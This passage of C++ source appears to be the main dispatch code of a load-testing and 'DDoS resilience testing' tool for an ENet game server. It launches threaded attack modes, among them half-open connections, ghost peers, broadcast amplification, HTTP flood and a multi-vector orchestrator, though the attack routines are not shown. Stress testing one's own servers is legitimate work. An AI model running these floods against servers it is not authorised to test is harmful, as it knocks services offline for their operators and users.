    // -----------------------------------------------------------------------
    // v7: Canary mode — single client RTT monitor
    // -----------------------------------------------------------------------
    if (cfg.mode == "canary") {
        printf("[mode] canary  target=%s:%d  world=%s\n",
            cfg.target.c_str(), cfg.port, cfg.canary_world.c_str());
        if (enet_initialize() != 0) {
            fprintf(stderr, "ENet init failed.\n"); return 1;
        }
        g_running.store(true);
        // Canary runs until SIGINT or --duration expires
        std::thread canary_thread(run_canary, std::cref(cfg));
        if (cfg.duration > 0) {
            for (int s = 0; s < cfg.duration && g_running.load(); s++)
                std::this_thread::sleep_for(std::chrono::seconds(1));
            g_running.store(false);
        }
        if (canary_thread.joinable()) canary_thread.join();
        enet_deinitialize();
        return 0;
    }

    // -----------------------------------------------------------------------
    // v7: Attack mode — DDoS resilience testing methods
    // -----------------------------------------------------------------------
    if (cfg.mode == "attack") {
        if (cfg.attack_type.empty()) {
            fprintf(stderr, "ERROR: --mode attack requires --attack-type\n");
            return 1;
        }

        printf("[mode] attack  type=%s  target=%s:%d  threads=%d  duration=%ds\n",
            cfg.attack_type.c_str(), cfg.target.c_str(), cfg.port,
            cfg.threads, cfg.duration);

        bool need_enet_lib = (cfg.attack_type != "enet-halfopen" &&
                              cfg.attack_type != "http" &&
                              cfg.attack_type != "http-flood");
        if (need_enet_lib && enet_initialize() != 0) {
            fprintf(stderr, "ENet init failed.\n"); return 1;
        }

        g_running.store(true);

        int n_threads = std::max(1, cfg.threads);
        for (int i = 0; i < n_threads; i++)
            g_stats.push_back(std::make_unique<ThreadStats>());

        // Init phase state
        g_phase.pps.store(cfg.pps);
        g_phase.set_phase_name("attack");
        g_phase.phase_num.store(1);

        // Spawn attack workers
        std::vector<std::thread> workers;
        for (int i = 0; i < n_threads; i++) {
            if (cfg.attack_type == "enet-halfopen")
                workers.emplace_back(run_enet_halfopen, i, std::cref(cfg));
            else if (cfg.attack_type == "ghost" || cfg.attack_type == "login-ghost") {
                // v7.2: use multi-peer if peers_per_thread > 1
                if (cfg.peers_per_thread > 1)
                    workers.emplace_back(run_multi_peer, i, std::cref(cfg));
                else
                    workers.emplace_back(run_ghost, i, std::cref(cfg));
            }
            else if (cfg.attack_type == "world-churn")
                workers.emplace_back(run_world_churn, i, std::cref(cfg));
            else if (cfg.attack_type == "broadcast-amp")
                workers.emplace_back(run_broadcast_amp, i, std::cref(cfg));
            else if (cfg.attack_type == "multi-peer" || cfg.attack_type == "mpeer")
                workers.emplace_back(run_multi_peer, i, std::cref(cfg));
            else if (cfg.attack_type == "slow" || cfg.attack_type == "slow-accumulate")
                workers.emplace_back(run_slow_accumulate, i, std::cref(cfg));
            else if (cfg.attack_type == "http" || cfg.attack_type == "http-flood")
                workers.emplace_back(run_http_flood, i, std::cref(cfg));
            else if (cfg.attack_type == "threshold" || cfg.attack_type == "auto-threshold")
                workers.emplace_back(run_threshold_detect, i, std::cref(cfg));
            else if (cfg.attack_type == "orchestrator" || cfg.attack_type == "multi-vector" ||
                     cfg.attack_type == "orch")
                workers.emplace_back(run_orchestrator, i, std::cref(cfg));
            else {
                fprintf(stderr, "ERROR: unknown attack-type '%s'\n", cfg.attack_type.c_str());
                g_running.store(false);
                break;
            }
        }

        // Stats reporter (reuse existing)
        std::thread reporter(stats_reporter, std::cref(cfg));

        // Duration timer
        if (cfg.duration > 0) {
            for (int s = 0; s < cfg.duration && g_running.load(); s++)
                std::this_thread::sleep_for(std::chrono::seconds(1));
            g_running.store(false);
        }

        for (auto& w : workers) if (w.joinable()) w.join();
        if (reporter.joinable()) reporter.join();

        print_summary();

        // v7: Cooldown recovery measurement
        if (cfg.cooldown_sec > 0) {
            if (!need_enet_lib && enet_initialize() != 0) {
                fprintf(stderr, "ENet init for cooldown failed.\n");
            } else {
                run_cooldown(cfg);
            }
        }

        if (need_enet_lib || cfg.cooldown_sec > 0) enet_deinitialize();
        return 0;
    }

    // -----------------------------------------------------------------------
    // UDP / Game mode: direct load test
    // -----------------------------------------------------------------------
    if (enet_initialize() != 0) {
        fprintf(stderr, "ENet init failed.\n"); return 1;
    }

    printf("[mode] %s  target=%s:%d  threads=%d  pps=%d  duration=%ds",
        cfg.mode.c_str(), cfg.target.c_str(), cfg.port,
        cfg.threads, cfg.pps, cfg.duration);
    if (cfg.mode == "game")
        printf("  clients=%d  world=%s", cfg.clients, cfg.world.c_str());
    printf("\n");
    if (cfg.crowd_mode)
        printf("[crowd] ON  stay_ms=%d\n", cfg.crowd_stay_ms);

    // Init global state
    g_running.store(true);
    g_in_warmup.store(false);
    g_clients_in_world.store(0);
    g_phase.pps.store(cfg.pps);
    g_phase.tile_burst_count.store(cfg.tile_burst_count);
    g_phase.tile_burst_ms.store(cfg.tile_burst_ms);
    g_phase.pattern_idx.store((int)cfg.pattern);
    g_phase.crowd_mode.store(cfg.crowd_mode);
    g_phase.crowd_stay_ms.store(cfg.crowd_stay_ms);
    g_phase.target_clients.store(0);
    g_phase.set_world(cfg.world);
    g_phase.set_phase_name("main");
    g_phase.phase_num.store(1);

    int n_threads = std::max(1, cfg.threads);
    for (int i = 0; i < n_threads; i++)
        g_stats.push_back(std::make_unique<ThreadStats>());

    // Warmup
    if (cfg.warmup > 0) {
        // Spawn minimal threads for warmup
        std::vector<std::thread> warmup_workers;
        for (int i = 0; i < n_threads; i++) {
            if (cfg.mode == "game")
                warmup_workers.emplace_back(game_adaptive_worker, i, std::cref(cfg));
            else
                warmup_workers.emplace_back(udp_worker, i, std::cref(cfg));
        }
        run_warmup(cfg.warmup);
        g_running.store(false);
        for (auto& w : warmup_workers) if (w.joinable()) w.join();
        g_running.store(true);
        // Re-init stats after warmup
        for (auto& ts : g_stats) {
            ts->packets_sent.store(0); ts->bytes_sent.store(0);
            ts->errors.store(0); ts->world_bytes_rx.store(0);
            ts->world_joins.store(0);  ts->tile_bursts.store(0);
            ts->send_failures.store(0); ts->rtt_samples.store(0);
            ts->rtt_hist.reset();
        }
        g_global_rtt.reset();
    }

    // Spawn workers
    std::vector<std::thread> workers;
    for (int i = 0; i < n_threads; i++) {
        if (cfg.mode == "game")
            workers.emplace_back(game_adaptive_worker, i, std::cref(cfg));
        else
            workers.emplace_back(udp_worker, i, std::cref(cfg));
    }

    // Stats reporter
    std::thread reporter(stats_reporter, std::cref(cfg));

    // Scenario runner
    ScenarioRunner scenario;
    std::thread scenario_thread;
    if (!cfg.scenario_file.empty()) {
        if (scenario.load(cfg.scenario_file)) {
            printf("[scenario] Loaded %zu phases from %s\n",
                scenario.phases.size(), cfg.scenario_file.c_str());
            scenario_thread = std::thread([&scenario]() { scenario.run(); });
        } else {
            fprintf(stderr, "[warn] Failed to load scenario: %s\n",
                cfg.scenario_file.c_str());
        }
    }

    // Wait for duration (or SIGINT / scenario end)
    if (cfg.scenario_file.empty() && cfg.duration > 0) {
        for (int s = 0; s < cfg.duration && g_running.load(); s++)
            std::this_thread::sleep_for(std::chrono::seconds(1));
        g_running.store(false);
    }

    // Join threads
    if (scenario_thread.joinable()) scenario_thread.join();
    g_running.store(false);
    for (auto& w : workers)   if (w.joinable()) w.join();
    if (reporter.joinable())  reporter.join();

    print_summary();

    // v7: Cooldown recovery measurement (available for all modes)
    if (cfg.cooldown_sec > 0) {
        run_cooldown(cfg);
    }

    enet_deinitialize();
    return 0;
}
